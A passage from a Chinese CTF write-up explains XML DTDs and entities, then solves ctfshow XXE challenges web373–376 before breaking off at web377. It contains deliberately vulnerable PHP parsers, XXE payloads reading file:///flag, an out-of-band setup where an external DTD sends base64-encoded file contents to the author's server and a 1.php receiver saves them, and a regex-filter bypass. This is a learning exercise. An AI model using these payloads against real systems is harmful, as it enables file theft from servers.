class="hljs-keyword">book</span>*)&gt;</span> </span><br><span class="hljs-meta">&lt;!-- 其中的*表示一个或多个book元素 --&gt;</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">book</span> <span class="hljs-keyword">EMPTY</span>&gt;</span></span><br><span class="hljs-meta">&lt;!-- 其中的EMPTY表示book是一个空元素 --&gt;</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ATTLIST <span class="hljs-keyword">book</span></span></span><br><span class="hljs-meta"><span class="hljs-meta">        <span class="hljs-keyword">id</span> <span class="hljs-keyword">ID</span> <span class="hljs-keyword">#REQUIRED</span></span></span><br><span class="hljs-meta"><span class="hljs-meta">        <span class="hljs-keyword">title</span> <span class="hljs-keyword">CDATA</span> <span class="hljs-keyword">#IMPLIED</span></span></span><br><span class="hljs-meta"><span class="hljs-meta">    &gt;</span></span><br><span class="hljs-meta">]&gt;</span><br></code></pre></td></tr></table></figure><h3 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h3><p>内部实体：<!ENTITY 实体名称 "实体值"></p><p>例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">article</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">title</span> <span class="hljs-string">&quot;Introduction to XML&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">author</span> <span class="hljs-string">&quot;John Doe&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">date</span> <span class="hljs-string">&quot;2024-03-26&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">article</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-symbol">&amp;title;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span><span class="hljs-symbol">&amp;author;</span><span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">date</span>&gt;</span><span class="hljs-symbol">&amp;date;</span><span class="hljs-tag">&lt;/<span class="hljs-name">date</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">content</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- 文章内容 --&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">content</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">article</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>外部实体：<!ENTITY 实体名称 SYSTEM "外部文件URI"></p><p>假设我们有一个包含很多实体的外部 XML 文件 entities.xml，它定义了一些常用的术语如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">entities</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">term1</span> <span class="hljs-string">&quot;XML&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">term2</span> <span class="hljs-string">&quot;HTML&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">term3</span> <span class="hljs-string">&quot;CSS&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br></code></pre></td></tr></table></figure><p>现在我们可以在另一个 XML 文档中引用这个外部实体文件，并且重复使用其中定义的术语如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">article</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;entities.xml&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">article</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Introduction to &amp;term1;<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">content</span>&gt;</span><br>        &amp;term1; is a markup language used for structuring and presenting content on the web.<br>        &amp;term2; is another markup language commonly used in web development.<br>        &amp;term3; is a style sheet language used for describing the presentation of a document written in a markup language.<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">content</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">article</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="ctfshow例题"><a href="#ctfshow例题" class="headerlink" title="ctfshow例题"></a>ctfshow例题</h2><h3 id="web-373"><a href="#web-373" class="headerlink" title="web 373"></a>web 373</h3><p>源码解析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2021-01-07 12:59:52</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2021-01-07 13:36:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">//以上是注释不用管</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">//禁用错误报告</span><br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<span class="hljs-comment">//可以使用实体加载器；如果将false改为ture那么将禁用实体加载器</span><br><br><span class="hljs-comment">//以下这个点将会成为我们注入的关键</span><br><br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<span class="hljs-comment">//从输入流中获取</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<span class="hljs-comment">//创建了一个DOMDocument对象</span><br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<span class="hljs-comment">//这行代码加载 XML 数据到 DOMDocument 对象中。LIBXML_NOENT 和 LIBXML_DTDLOAD 是解析选项，用于控制解析器的行为。其中，LIBXML_NOENT 用于防止实体替换，LIBXML_DTDLOAD 用于允许加载 DTD</span><br>    <span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<span class="hljs-comment">//这行代码将 DOMDocument 对象转换为 SimpleXMLElement 对象 这样可以更简单的对数据进行处理</span><br>    <span class="hljs-variable">$ctfshow</span> = <span class="hljs-variable">$creds</span>-&gt;ctfshow;<span class="hljs-comment">//寻找数据中的ctfshow元素或者实体</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$ctfshow</span>;<span class="hljs-comment">//将其输出</span><br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-comment">//高亮显示这个文档的代码    </span><br><br></code></pre></td></tr></table></figure><p>有以上的代码可以知道我们需要在传入的数据中有实体并且这个实体存在于元素ctfshow中开始构造：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">xxe</span>[</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">hack</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">H3rme</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ctfshow</span>&gt;</span><br>        <span class="hljs-symbol">&amp;hack;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">ctfshow</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">H3rmes</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4><p><strong>对于DOCTYPE和ENTITY的拼写一定要注意不要拼写错误了还有file:&#x2F;&#x2F;后表示访问本地文件的路径&#x2F;表示根目录  我试过.&#x2F;不行表示当前文件夹</strong></p><p><strong>还有一点元素ctfshow一定要直接放到根元素下这样才能被直接访问到            我试过加一个元素嵌套或者直接把ctfshow作为根元素但是不行这样会导致它不能直接的正确地解析到直接在根元素下的元素</strong></p><p>这些问题都会直接导致无法正确的输出flag</p><p>操作如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-27%20214354.png" alt="屏幕截图 2024-03-27 214354"></p><p>以上是改包直接在bp中看response</p><p>也可以直接改包发包然后在浏览器中看flag 如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-27%20214449.png" alt="屏幕截图 2024-03-27 214449"></p><h4 id="实体替换："><a href="#实体替换：" class="headerlink" title="实体替换："></a>实体替换：</h4><p>举个例子：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">example</span>[</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">hello</span> <span class="hljs-string">&quot;Hello, World!&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">greeting</span>&gt;</span><span class="hljs-symbol">&amp;hello;</span><span class="hljs-tag">&lt;/<span class="hljs-name">greeting</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>以上代码中的&amp;hello会被替换成Hello，world这便是实体替换</p><p>但是以下代码中的实体是指路径不是具体的值所以并不能算实体替换</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">xxe</span>[</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">hack</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">H3rmesk1t</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ctfshow</span>&gt;</span><br>        <span class="hljs-symbol">&amp;hack;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">ctfshow</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">H3rmesk1t</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="web374"><a href="#web374" class="headerlink" title="web374"></a>web374</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2021-01-07 12:59:52</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2021-01-07 13:36:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);  <br></code></pre></td></tr></table></figure><p>经过和第一关的对比发现这关比上一关少一些代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<br>   <span class="hljs-variable">$ctfshow</span> = <span class="hljs-variable">$creds</span>-&gt;ctfshow;<br>   <span class="hljs-keyword">echo</span> <span class="hljs-variable">$ctfshow</span>;<br></code></pre></td></tr></table></figure><p>也就是说这关无法将我们想要的flag输出因此我们不能再试图从页面中得到flag可以试试去将其中的flag输出到其他地方 比如：通过一个网址将其输入到对应的服务器上</p><p>（前提要有一个公网ip也就是需要一个服务器操作系统要centos [推荐学生可以去免费领几个月：<a href="https://developer.aliyun.com/plan/student]">https://developer.aliyun.com/plan/student]</a> 然后下载宝塔这样便于我们对根目录的文件进行操作 相关教程可以去网上搜 ）注意：在操作的时候要注意的几个点：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240329151425106.png" alt="image-20240329151425106"></p><p>新建的时候这样操作可以直接通过这个ip来访问而且也可以对其的根目录文件操作，同时不需要再去购买域名</p><p>还有一点：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-29%20130659.png" alt="屏幕截图 2024-03-29 130659"></p><p>如果重启web服务器而且各种办法都没有办法解决的话可以去试试换个浏览器   （亲测有奇效）</p><p>然后开始做题：</p><p>首先在我们在宝塔中所创建的网站的根目录下创建两个文件</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240329152235339.png" alt="image-20240329152235339"></p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240329152312752.png" alt="image-20240329152312752"></p><p>xxe.xml:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtd</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25; xxe  SYSTEM &#x27;http://填自己创建的网站的ip/1.php?file=%file;&#x27;&gt; &quot;</span>&gt;</span><br>%dtd;<br>%xxe;<br></code></pre></td></tr></table></figure><p>这行代码使用了两个实体参数<code>&amp;#x25;</code>就是一个html实体编码和%一样 它的作用是当xml解析器解析是会去访问<code>http://填自己创建的网站的ip/1.php?file=%file</code>从而会通过get传参将参数%file中的内容输入到这个网站对应的目录中</p><p>1.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) ; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>和以上代码搭配使用将file的内容传入到文件test.txt中</p><p>然后payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">aaa</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://填自己创建的网站的ip/xxe.xml&quot;</span>&gt;</span></span><br><span class="hljs-meta">%aaa;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br><span class="hljs-comment">&lt;!--以上代码同样也主要是实体参数 可以看出参数%file的内容是经过base64编码后的flag（php://filter 是封装器，用于对数据进行过滤和处理）然后先声明%aaa 然后通过%aaa进行访问到xml文件从而将参数%file成功传入再通过后端php最后会出现一个新文件test.txt里面的内容便是经过base64编码后的flag </span><br><span class="hljs-comment">在这里因为flag中存在特殊字符在传输的时候可能会导致出现错误所以进行了base64编码--&gt;</span><br></code></pre></td></tr></table></figure><p>如图:</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240329161102352.png" alt="image-20240329161102352"></p><p>然后刷新宝塔发现新出现了一个test.txt </p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240329161226302.png" alt="image-20240329161226302"></p><p>然后将里面的内容进行base64解码 在线解码工具：<a href="https://www.base64decode.org/zh/">https://www.base64decode.org/zh/</a></p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-29%20161404.png" alt="屏幕截图 2024-03-29 161404"></p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-29%20161434.png" alt="屏幕截图 2024-03-29 161434"></p><p>完成！</p><h3 id="web375"><a href="#web375" class="headerlink" title="web375"></a>web375</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2021-01-07 12:59:52</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2021-01-07 15:22:05</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;</span>, <span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);    <br><br></code></pre></td></tr></table></figure><p>本关是在上一关的基础上又加了一个正则匹配<?xml version="1.0"?></p><p>我们只需要把上一关的xxe.xml改成xxe.dtd</p><p>还有payload也要相应的改变一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!DOCTYPE test [<br>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;<br>&lt;!ENTITY % aaa SYSTEM &quot;http://填自己创建的网站的ip/xxe.dtd&quot;&gt;<br>%aaa;<br>]&gt;<br>&lt;root&gt;123&lt;/root&gt;<br></code></pre></td></tr></table></figure><p>其余操作不变</p><p> 如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-29%20164653.png" alt="屏幕截图 2024-03-29 164653"></p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-29%20164717.png" alt="屏幕截图 2024-03-29 164717"></p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-29%20164728.png" alt="屏幕截图 2024-03-29 164728"></p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-29%20165021.png" alt="屏幕截图 2024-03-29 165021"></p><p>解决！</p><p>也可以通过大写.XML来绕过</p><h3 id="web-376"><a href="#web-376" class="headerlink" title="web 376"></a>web 376</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2021-01-07 12:59:52</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2021-01-07 15:23:51</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/i&#x27;</span>, <span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);   <br></code></pre></td></tr></table></figure><p>这关只是在正则匹配上做了一些改变      变成了正则匹配的时候不区分大小写</p><p>直接拿上一关的方法做即可！</p><h3 id="web-377"><a href="#web-377" class="headerlink" title="web 377"></a>web 377</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 